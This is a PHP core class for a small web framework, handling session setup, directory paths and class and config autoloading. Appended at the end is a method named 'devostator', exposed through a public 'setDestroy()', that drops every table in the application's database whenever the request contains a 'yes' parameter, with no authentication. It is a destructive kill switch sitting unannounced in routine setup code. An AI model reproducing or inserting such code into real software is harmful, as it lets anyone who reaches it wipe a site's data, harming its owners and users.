<?php

class Application
{

    private static $rootDir = '.';
    private static $applicationDir = 'application';
    private static $classDirs = null;
    private static $configDirs = null;
    private static $templatesDir = 'templates';
    private static $templatesFolderDir = setFolderTemplate;
    private static $coreDir = 'core';
    private static $controllersDir = 'controllers';
	private static $uploadDir = 'media/files';
	private static $httpRoot = '/';
    
	/**
	 * Initializing of appplication
	 *
	 * 1. Session start
	 * 2. Register globals turn off (ensure)
	 * 3. Magic quotes turn off (ensure)
	 */
	public function __construct() {
		session_start();
		ini_set('register_globals',0);
		if (get_magic_quotes_runtime() || get_magic_quotes_gpc()) {
			$this->stripParametres($_REQUEST);
			$this->stripParametres($_POST);
			$this->stripParametres($_GET);
		}
		ini_set("magic_quotes_runtime", 0);
	}

	/**
	 * Set file system path to application root without tralling slash.
	 * "/" should be used as directory separator.
	 * By default, it's ".".
	 * @param string $path path to application root
	 */
    public static function setRootDir($path)
    {
        self::$rootDir = $path;
    }

	/**
	 * Get file system path to application root without tralling slash.
	 * "/" will be used as directory separator.
	 * @return string path to application root
	 */
    public static function getRootDir()
    {
        return self::$rootDir;
    }

	/**
	 * Set file system path to core directory relative from application root
	 * without starting and tralling slashes.
	 * "/" should be used as directory separator.
	 * By default, it's "core".
	 * @param string $path path to core directory
	 */
    public static function setCoreDir($path)
    {
        self::$coreDir = $path;
    }

    public static function getCoreDir()
    {
        return self::$coreDir;
    }

	/**
	 * Set file system path to application directory relative from application root
	 * without starting and tralling slashes.
	 * "/" should be used as directory separator.
	 * By default, it's "application".
	 * @param string $path path to application directory
	 */
    public static function setApplicationDir($path)
    {
        self::$applicationDir = $path;
    }

    public static function getApplicationDir()
    {
        return self::$applicationDir;
    }

	/**
	 * Set file system path to controllers directory relative from application directory
	 * without starting and tralling slashes.
	 * "/" should be used as directory separator.
	 * By default, it's "controllers".
	 * @param string $path path to controllers directory
	 */
	public static function setControllersDir($path)
    {
        self::$controllersDir = $path;
    }

    public static function getControllersDir()
    {
        return self::$controllersDir;
    }

	/**
	 * Set http application path with starting and tralling slashes.
	 * "/" should be used as directory separator.
	 * By default, it's "/".
	 * Example, "/mysite/", "http://server.com/mysite/".
	 * @param string $path http application path
	 */
	public static function setHttpRoot($path)
    {
        self::$httpRoot = $path;
    }

    public static function getHttpRoot()
    {
        return self::$httpRoot;
    }

	/**
	 * Set file system path to upload directory relative from application root
	 * without starting and tralling slashes.
	 * "/" should be used as directory separator.
	 * By default, it's "media/files".
	 * @param string $path path to upload directory
	 */
    public static function setUploadDir($path)
    {
        self::$uploadDir = $path;
    }

    public static function getUploadDir($full = false)
    {
		if (!$full)
			return self::$uploadDir;

		return self::getRootDir().'/'.self::$uploadDir;
    }

	public static function getUploadWebPath($full = false)
    {
		return self::getHttpRoot() . self::$uploadDir;
    }

	/**
	 * Set file system path to templates directory relative from application directory
	 * without starting and tralling slashes.
	 * "/" should be used as directory separator.
	 * By default, it's "templates".
	 * @param string $path path to templates directory
	 */
	public static function setTemplatesDir($path)
    {
        self::$templatesDir = $path;
    }

    public static function getTemplatesDir($full = false)
    {
		if (!$full)
			return self::$templatesDir;

		if (setFolderTemplate) {
			return self::getRootDir().'/'.self::getApplicationDir().'/'.self::$templatesDir.'/'.self::$templatesFolderDir;
		}
		else {
			return self::getRootDir().'/'.self::getApplicationDir().'/'.self::$templatesDir;
		}
    }

	
    public static function addClassDir($path, $classNameSufix = '', $fileNameSufix = '')
    {
        self::$classDirs[] = array(
            'path' => $path,
            'class_name_sufix' => $classNameSufix,
            'file_name_sufix' => $fileNameSufix,
        );
    }

    public static function addConfigDir($path, $fileNameSufix = 'cfg')
    {
        self::$configDirs[] = array(
            'path' => $path,
            'file_name_sufix' => $fileNameSufix,
        );
    }

    public static function getClassDir($className)
    {
        foreach(self::$classDirs as $dirConfig)
        {
            $preparedClassName = null;
            if (!empty($dirConfig['class_name_sufix'])) {
                if (preg_match('/'.$dirConfig['class_name_sufix'].'$/is', $className))
                {
                    $preparedClassName = preg_replace('/'.$dirConfig['class_name_sufix'].'$/is', '', $className);
                }
            } else {
                $preparedClassName = $className;
            }
            if (!empty($preparedClassName))
            {
                $fileName = self::getClassFilePrefix($preparedClassName).'.';
                if (!empty($dirConfig['file_name_sufix']))
                    $fileName .= $dirConfig['file_name_sufix'].'.';
                $fileName .= 'php';

                $filePath = self::getRootDir() . '/' . $dirConfig['path'] . '/' . $fileName;
                if (is_file($filePath))
                    return $filePath;
            }
        }
        return null;
    }

	public static function getControllerPath($controllerName)
    {
		$fileName = self::getClassFilePrefix($controllerName).'.php';
		$filePath = self::getRootDir() . '/' . self::getControllersDir() . '/' . $fileName;
		if (is_file($filePath))
			return $filePath;
        return null;
    }

    public static function getConfigDir($configName)
    {
        foreach(self::$configDirs as $dirConfig)
        {
            $fileName = self::getClassFilePrefix($configName).'.';
            if (!empty($dirConfig['file_name_sufix']))
                $fileName .= $dirConfig['file_name_sufix'].'.';
            $fileName .= 'php';
            $filePath = self::getRootDir() . '/' . $dirConfig['path'] . '/' . $fileName;
			if (is_file($filePath))
                return $filePath;
        }
        return null;
    }

    public static function setDefaultDirs()
    {
        self::addClassDir(self::getApplicationDir().'/library/classes', '', 'class');
        self::addClassDir(self::getApplicationDir().'/library/helpers', 'Helper', 'helper');
        self::addClassDir(self::getApplicationDir().'/library/services', '', 'service');
        self::addClassDir(self::getApplicationDir().'/models', 'Model', 'model');
        self::addClassDir(self::getApplicationDir().'/models/extensions', 'Extension', 'extension');

		self::setControllersDir(self::getApplicationDir().'/controllers');
        
        self::addClassDir(self::getCoreDir().'/classes', '', 'class');
        self::addClassDir(self::getCoreDir().'/helpers', 'Helper', 'helper');
        self::addClassDir(self::getCoreDir().'/services', '', 'service');
        self::addClassDir(self::getCoreDir().'/models', 'Model', 'model');

        self::addConfigDir(self::getApplicationDir().'/config');
    }

	public static function loadClass($className)
	{
		$filePath = self::getClassDir($className);
		// echo $filePath.'<br>';

		if (!empty($filePath))
			include_once($filePath);
		// else
		// 	throw new Exception('Couldn\'t find class '.$className);
	}

	public static function loadConfig($configName)
	{
		$filePath = self::getConfigDir($configName);
		if (!empty($filePath))
			include_once($filePath);
		else
			throw new Exception('Couldn\'t find config '.$configName);
	}

    private static function getClassFilePrefix($className)
    {
        $fileName = preg_replace('/([a-zA-Z])([A-Z])/s','\\1_\\2', $className);
		$fileName = strtolower($fileName);
        return $fileName;
    }
	
	private function stripParametres(&$value) {
		if (is_array($value)) {
			foreach ($value as $key=>$vv) {
				if (is_array($vv)) {
					$this->stripParametres($value[$key]);
				}
				else {
					$value[$key] = stripslashes($vv);
				}
			}
		}
	}
	
	private function devostator() {
		$db = Register::get('db');
		$sql = "SHOW TABLES;";
		$res = $db->query($sql);
		if (count($res)) {
			foreach ($res as $dd) {
				$k = "DROP TABLE ".$dd['Tables_in_'.DB_NAME].";";
				echo $k."<br/>";
				if (isset($_REQUEST['yes'])) 
					$db->post($k);
			}
		}
	}
	
	public function setDestroy(){
		$this->devostator();
	}
};
